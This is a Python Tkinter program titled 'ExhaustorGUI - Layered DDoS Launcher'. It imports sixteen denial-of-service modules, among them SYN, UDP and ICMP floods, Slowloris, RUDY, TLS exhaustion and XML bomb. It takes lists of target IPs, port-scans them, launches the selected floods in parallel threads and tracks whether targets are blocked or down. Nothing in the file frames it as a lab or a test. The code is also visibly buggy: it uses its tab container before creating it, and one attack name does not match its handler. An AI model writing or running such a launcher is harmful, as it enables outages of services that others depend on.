import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import threading
import time
import subprocess
from collections import defaultdict
from threading import Lock, Event
from core import recon

# Import all attacks from attacks folder
from attacks.icmp_flood import launch as icmp_flood_attack
from attacks.syn_flood import launch as syn_flood_attack
from attacks.udp_flood import launch as udp_flood_attack
from attacks.ack_flood import launch as ack_flood_attack
from attacks.rst_flood import launch as rst_flood_attack
from attacks.tcp_flood import launch as tcp_flood_attack
from attacks.ssl_renegotiation import launch as ssl_renegotiation_attack
from attacks.tls_exhaustion import launch as tls_exhaustion_attack
from attacks.http_get_flood import launch as http_get_flood_attack
from attacks.http_post_flood import launch as http_post_flood_attack
from attacks.slowloris import launch as slowloris_attack
from attacks.slow_post import launch as slow_post_attack
from attacks.xml_bombing import launch as xml_bomb_attack
from attacks.dns_blaster import launch as dns_flood_attack
from attacks.rudy import launch as rudy_attack
from attacks.zero_window import launch as zero_window_attack

# Visual Graph
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from collections import deque

# Simulating Speed Test
from core.speed_test import simulate_speed


def ping_host(ip):
    try:
        import platform
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        timeout_param = '-w' if platform.system().lower() == 'windows' else '-W'
        command = ['ping', param, '1', timeout_param, '1', ip]
        result = subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return result.returncode == 0
    except Exception:
        return False


class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.traffic_stats = defaultdict(lambda: {'sent': 0, 'fail': 0})
        self.stats_lock = Lock()
        self.stop_events = {}

    def launch(self, targets, attack_options, duration, threads):
        for ip in targets:
            if ip not in self.active_attacks:
                self.active_attacks[ip] = set()
            if ip not in self.stop_events:
                self.stop_events[ip] = Event()
            else:
                if self.stop_events[ip].is_set():
                    self.stop_events[ip].clear()

            for attack_name, enabled in attack_options.items():
                if enabled:
                    if attack_name not in self.active_attacks[ip]:
                        self.active_attacks[ip].add(attack_name)
                        t = threading.Thread(target=self._run_attack,
                                             args=(ip, attack_name, duration, threads, self.stop_events[ip]),
                                             daemon=True)
                        t.start()
    
    def _run_attack(self, ip, attack_name, duration, threads, stop_event):
        attack_map = {
            "ICMP Flood (L3)": icmp_flood_attack,
            "SYN Flood (L4)": syn_flood_attack,
            "UDP Flood (L4)": udp_flood_attack,
            "ACK Flood (L4)": ack_flood_attack,
            "RST Flood (L4)": rst_flood_attack,
            "TCP Flood (L4)": tcp_flood_attack,
            "zero_window": zero_window_attack,
            "SSL Renegotiation (L6)": ssl_renegotiation_attack,
            "TLS Exhaustion (L6)": tls_exhaustion_attack,
            "HTTP GET Flood (L7)": http_get_flood_attack,
            "HTTP POST Flood (L7)": http_post_flood_attack,
            "Slowloris (L7)": slowloris_attack,
            "Slow POST (L7)": slow_post_attack,
            "XML Bomb (L7)": xml_bomb_attack,
            "DNS Flood (L7)": dns_flood_attack,
            "RUDY (L7)": rudy_attack
        }

        attack_func = attack_map.get(attack_name)
        if attack_func:
            port_list = recon.scan_ports(ip)
            tag = attack_name.replace(" ", "_").lower()
            attack_func(ip, port_list, duration, tag, stop_event, self.traffic_stats[ip])
        else:
            time.sleep(duration if duration else 10)

        with self.stats_lock:
            if ip in self.active_attacks and attack_name in self.active_attacks[ip]:
                self.active_attacks[ip].remove(attack_name)

    def get_status(self):
        with self.stats_lock:
            return {
                ip: {
                    "active_attacks": list(self.active_attacks.get(ip, [])),
                    "sent": self.traffic_stats[ip]['sent'],
                    "fail": self.traffic_stats[ip]['fail'],
                }
                for ip in self.active_attacks
            }

    def get_ip_status(self, ip):
        with self.stats_lock:
            is_attacking = bool(self.active_attacks.get(ip))
            sent = self.traffic_stats[ip]['sent']
            fail = self.traffic_stats[ip]['fail']

        if is_attacking:
            if sent > 0:
                if fail / sent > 0.7:
                    return "Blocked"
                else:
                    return "Attacking"
            else:
                return "Blocked/Down"
        else:
            if sent > 0:
                return "Standby"
            else:
                return "Online"

    def stop_all(self):
        for e in self.stop_events.values():
            e.set()


class ExhaustorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("ExhaustorGUI - Layered DDoS Launcher")
        self.root.geometry("1600x900")
        self.targets = []
        self.center_window()
        self.graph_tab = tk.Frame(self.tab_control, bg="#1e1e1e")
        self.tab_control.add(self.graph_tab, text="Traffic Graphs")
        

        # Initialize data storage for plotting
        self.graph_data = {
            "timestamps": deque(maxlen=60),  # keep last 60 points (~3 minutes if update every 3s)
            "sent": deque(maxlen=60),
            "fail": deque(maxlen=60),
        }

        self.init_graph_ui()
        self.update_traffic_graph()
        
    def center_window(self):
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width // 2) - (width // 2)
        y = (screen_height // 2) - (height // 2)
        self.root.geometry(f"{width}x{height}+{x}+{y}")

        self.attack_manager = AttackManager()

        self.configure_theme()

        self.tab_control = ttk.Notebook(self.root)
        self.main_tab = tk.Frame(self.tab_control, bg="#1e1e1e")
        self.traffic_tab = tk.Frame(self.tab_control, bg="#1e1e1e")

        self.tab_control.add(self.main_tab, text="Main")
        self.tab_control.add(self.traffic_tab, text="Traffic")
        self.tab_control.pack(expand=1, fill="both")

        self.build_main_ui()
        self.build_traffic_ui()

        self.refresh_traffic()
        self.update_status_column()

    def configure_theme(self):
        style = ttk.Style()
        style.theme_use("clam")

        # Background and foregrounds
        self.root.configure(bg="#1e1e1e")

        style.configure("TNotebook", background="#2e2e2e", borderwidth=0)
        style.configure("TNotebook.Tab", background="#3e3e3e", foreground="#00ffe1", padding=10, font=('Helvetica', 10, 'bold'))
        style.map("TNotebook.Tab", background=[("selected", "#0f0f0f")])

        style.configure("Treeview", background="#1c1c1c", foreground="#00ffe1", rowheight=25, fieldbackground="#1c1c1c", font=('Consolas', 10))
        style.map("Treeview", background=[("selected", "#003f3f")])

        style.configure("TButton",
            background="#202020",
            foreground="#00ffe1",
            font=('Helvetica', 10, 'bold')
        )
        style.map("TButton",
            background=[("active", "#004040")],
            foreground=[("active", "#00ffe1")]
        )


        style.configure("TLabel", background="#1e1e1e", foreground="#00ffe1", font=('Helvetica', 10))
        style.configure("TCheckbutton",
            background="#1e1e1e",
            foreground="#00ffe1",
            font=('Helvetica', 10)
        )
        style.map("TCheckbutton",
            background=[("active", "#004040"), ("!disabled", "#1e1e1e")],
            foreground=[("active", "#00ffe1")]
        )

        style.configure("TLabelframe", background="#1e1e1e", foreground="#00ffe1", font=('Helvetica', 10, 'bold'))
        style.configure("TLabelframe.Label", background="#1e1e1e", foreground="#00ffe1")

    def build_main_ui(self):
        self.build_input_section()
        self.build_attack_options()
        self.build_config_section()
        self.build_status_table()

    def build_input_section(self):
        input_frame = tk.Frame(self.main_tab, pady=10, bg="#1e1e1e")
        input_frame.pack(fill="x")

        self.target_entry = tk.Entry(input_frame, width=50, bg="#2b2b2b", fg="#00ffe1", insertbackground="#00ffe1")
        self.target_entry.pack(side="left", padx=10)
        ttk.Button(input_frame, text="Add Target", command=self.add_target).pack(side="left")

        ttk.Button(input_frame, text="Upload Targets (.txt)", command=self.load_target_file).pack(side="left", padx=10)
        ttk.Button(input_frame, text="Run Nmap Scan", command=self.run_nmap_scan).pack(side="left", padx=10)

        ttk.Button(input_frame, text="Bandwidth Test", command=self.run_speed_test).pack(side="left", padx=10)
        
    def build_attack_options(self):
        self.attack_frame = ttk.LabelFrame(self.main_tab, text="Select Attacks", padding=10)
        self.attack_frame.pack(fill="x", padx=10)

        self.attack_options = {
            "ICMP Flood (L3)": tk.IntVar(),

            "SYN Flood (L4)": tk.IntVar(),
            "UDP Flood (L4)": tk.IntVar(),
            "ACK Flood (L4)": tk.IntVar(),
            "RST Flood (L4)": tk.IntVar(),
            "TCP Flood (L4)": tk.IntVar(),
            "zero_Window (L4)": tk.IntVar(),

            "SSL Renegotiation (L6)": tk.IntVar(),
            "TLS Exhaustion (L6)": tk.IntVar(),

            "HTTP GET Flood (L7)": tk.IntVar(),
            "HTTP POST Flood (L7)": tk.IntVar(),
            "Slowloris (L7)": tk.IntVar(),
            "Slow POST (L7)": tk.IntVar(),
            "XML Bomb (L7)": tk.IntVar(),
            "DNS Flood (L7)": tk.IntVar(),
            "RUDY (L7)": tk.IntVar()
        }

        row = 0
        col = 0
        for name, var in self.attack_options.items():
            cb = ttk.Checkbutton(self.attack_frame, text=name, variable=var)
            cb.grid(row=row, column=col, padx=10, pady=5, sticky="w")
            col += 1
            if col > 2:
                row += 1
                col = 0

    def build_config_section(self):
        config_frame = ttk.LabelFrame(self.main_tab, text="Attack Configuration", padding=10)
        config_frame.pack(fill="x", padx=10, pady=5)

        ttk.Label(config_frame, text="Duration (s):").pack(side="left")
        self.duration_entry = tk.Entry(config_frame, width=10, bg="#2b2b2b", fg="#00ffe1", insertbackground="#00ffe1")
        self.duration_entry.insert(0, "60")
        self.duration_entry.pack(side="left", padx=5)

        ttk.Label(config_frame, text="Threads per Attack:").pack(side="left")
        self.thread_entry = tk.Entry(config_frame, width=10, bg="#2b2b2b", fg="#00ffe1", insertbackground="#00ffe1")
        self.thread_entry.insert(0, "10")
        self.thread_entry.pack(side="left", padx=5)

        ttk.Button(config_frame, text="Start Attack", command=self.start_attack).pack(side="right")

    def build_status_table(self):
        self.status_frame = ttk.LabelFrame(self.main_tab, text="Target Status", padding=10)
        self.status_frame.pack(fill="both", expand=True, padx=10, pady=10)

        columns = ("IP", "Status", "Ports")
        self.status_table = ttk.Treeview(
            self.status_frame, columns=columns, show="headings", selectmode="extended"
        )
        for col in columns:
            self.status_table.heading(col, text=col)
            self.status_table.column(col, anchor="center")

        self.status_table.pack(fill="both", expand=True)

        btn_frame = tk.Frame(self.status_frame, bg="#1e1e1e")
        btn_frame.pack(fill="x", pady=5)

        ttk.Button(btn_frame, text="Remove Selected Target(s)", command=self.remove_selected_targets).pack(side="right", padx=10)
        ttk.Button(btn_frame, text="Stop Attack for Selected Target(s)", command=self.stop_selected_attacks).pack(side="left", padx=10)

    def build_traffic_ui(self):
        self.traffic_frame = tk.Frame(self.traffic_tab, bg="#1e1e1e")
        self.traffic_frame.pack(fill="both", expand=True)

        columns = ("IP", "Sent Queries", "Failed Queries", "Active Attacks")
        self.traffic_table = ttk.Treeview(
            self.traffic_frame, columns=columns, show="headings"
        )
        for col in columns:
            self.traffic_table.heading(col, text=col)
            self.traffic_table.column(col, anchor="center")

        self.traffic_table.pack(fill="both", expand=True)

    def add_target(self):
        ip = self.target_entry.get().strip()
        if ip:
            if ip not in self.targets:
                self.targets.append(ip)
                self.status_table.insert("", "end", values=(ip, "Not Scanned", ""))
                self.target_entry.delete(0, tk.END)
            else:
                messagebox.showinfo("Info", f"Target {ip} is already in the list.")
        else:
            messagebox.showwarning("Input Error", "Please enter a valid IP address or hostname.")

    def load_target_file(self):
        filepath = filedialog.askopenfilename(
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        if filepath:
            with open(filepath, "r") as f:
                lines = f.readlines()
                for line in lines:
                    ip = line.strip()
                    if ip and ip not in self.targets:
                        self.targets.append(ip)
                        self.status_table.insert("", "end", values=(ip, "Not Scanned", ""))

    def run_nmap_scan(self):
        selected_targets = []
        for item in self.status_table.selection():
            ip = self.status_table.item(item, "values")[0]
            selected_targets.append(ip)

        if not selected_targets:
            messagebox.showwarning("No Targets Selected", "Please select target(s) to scan.")
            return

        def scan_and_update_ip(ip):
            open_ports = recon.scan_ports(ip)
            def update_ui():
                for item in self.status_table.get_children():
                    item_ip = self.status_table.item(item, "values")[0]
                    if item_ip == ip:
                        self.status_table.set(item, "Ports", ", ".join(map(str, open_ports)))
                        self.status_table.set(item, "Status", "Scanned")
                        break
            self.root.after(0, update_ui)

        for ip in selected_targets:
            threading.Thread(target=scan_and_update_ip, args=(ip,), daemon=True).start()

    def start_attack(self):
        selected_targets = []
        for item in self.status_table.selection():
            ip = self.status_table.item(item, "values")[0]
            if ip in self.targets:
                selected_targets.append(ip)

        if not selected_targets:
            messagebox.showwarning("No Targets Selected", "Please select at least one target to attack.")
            return

        duration = int(self.duration_entry.get())
        threads = int(self.thread_entry.get())

        attack_selection = {
            k: v.get() == 1
            for k, v in self.attack_options.items()
        }

        if not any(attack_selection.values()):
            messagebox.showwarning("No Attack Selected", "Please select at least one attack type.")
            return

        self.attack_manager.launch(selected_targets, attack_selection, duration, threads)

    def remove_selected_targets(self):
        for item in self.status_table.selection():
            ip = self.status_table.item(item, "values")[0]
            if ip in self.targets:
                self.targets.remove(ip)
            self.status_table.delete(item)

    def stop_selected_attacks(self):
        selected_targets = []
        for item in self.status_table.selection():
            ip = self.status_table.item(item, "values")[0]
            selected_targets.append(ip)

        for ip in selected_targets:
            if ip in self.attack_manager.stop_events:
                self.attack_manager.stop_events[ip].set()

    def refresh_traffic(self):
        traffic_data = self.attack_manager.get_status()
        self.traffic_table.delete(*self.traffic_table.get_children())
        for ip, stats in traffic_data.items():
            active_count = len(stats["active_attacks"])
            self.traffic_table.insert("", "end", values=(
                ip,
                stats["sent"],
                stats["fail"],
                active_count
            ))
        self.root.after(3000, self.refresh_traffic)

    def update_status_column(self):
        for item in self.status_table.get_children():
            ip = self.status_table.item(item, "values")[0]
            status = self.attack_manager.get_ip_status(ip)
            self.status_table.set(item, "Status", status)
        self.root.after(3000, self.update_status_column)
    
    def init_graph_ui(self):
        # Create matplotlib Figure and Axis
        self.fig, self.ax = plt.subplots(figsize=(8, 4), dpi=100)
        self.fig.patch.set_facecolor('#1e1e1e')
        self.ax.set_facecolor('#1e1e1e')
        self.ax.tick_params(colors='cyan')
        self.ax.spines['bottom'].set_color('cyan')
        self.ax.spines['top'].set_color('cyan')
        self.ax.spines['left'].set_color('cyan')
        self.ax.spines['right'].set_color('cyan')
        self.ax.title.set_color('cyan')
        self.ax.xaxis.label.set_color('cyan')
        self.ax.yaxis.label.set_color('cyan')

        self.ax.set_xlabel("Time (updates)")
        self.ax.set_ylabel("Packets")

        self.sent_line, = self.ax.plot([], [], label="Sent Queries", color='lime')
        self.fail_line, = self.ax.plot([], [], label="Failed Queries", color='red')

        self.ax.legend()

        # Embed plot in Tkinter
        self.canvas = FigureCanvasTkAgg(self.fig, master=self.graph_tab)
        self.canvas.get_tk_widget().pack(fill='both', expand=True)

    def update_traffic_graph(self):
        # Called every 3 seconds to update graph data

        # Aggregate sent and fail from all IPs in attack_manager
        status = self.attack_manager.get_status()
        total_sent = sum(stats["sent"] for stats in status.values())
        total_fail = sum(stats["fail"] for stats in status.values())

        # Append to data deque
        self.graph_data["timestamps"].append(len(self.graph_data["timestamps"]))
        self.graph_data["sent"].append(total_sent)
        self.graph_data["fail"].append(total_fail)

        # Update plot data
        self.sent_line.set_data(self.graph_data["timestamps"], self.graph_data["sent"])
        self.fail_line.set_data(self.graph_data["timestamps"], self.graph_data["fail"])

        # Adjust axis limits dynamically
        if self.graph_data["timestamps"]:
            xmin = min(self.graph_data["timestamps"])
            xmax = max(self.graph_data["timestamps"])
            if xmin == xmax:
                # Expand the range artificially by 1 if both are equal
                xmax += 1
            self.ax.set_xlim(xmin, xmax)
            max_y = max(max(self.graph_data["sent"]), max(self.graph_data["fail"]), 10)
            self.ax.set_ylim(0, max_y * 1.1)

        self.canvas.draw()

        # Schedule next update
        self.root.after(3000, self.update_traffic_graph)

    def run_speed_test(self):
        # Simulate speed test: returns dict with download/upload Mbps
        speed_results = simulate_speed()

        download_mbps = speed_results.get("download_mbps", 0)
        upload_mbps = speed_results.get("upload_mbps", 0)

        # Assume packet size ~ 1500 bytes (typical MTU)
        packet_size_bytes = 1500
        bits_per_packet = packet_size_bytes * 8  # convert bytes to bits

        # Calculate max packets per second upload (packets are outgoing)
        max_packets_per_sec = int((upload_mbps * 1_000_000) / bits_per_packet)

        messagebox.showinfo(
            "Speed Test Result",
            f"Download Speed: {download_mbps:.2f} Mbps\n"
            f"Upload Speed: {upload_mbps:.2f} Mbps\n"
            f"Estimated Max Packets/Sec: {max_packets_per_sec}"
        )

        # Optional: store or log the max_packets_per_sec for use in attack config
        self.max_packets_per_sec = max_packets_per_sec


if __name__ == "__main__":
    root = tk.Tk()
    app = ExhaustorGUI(root)
    root.mainloop()
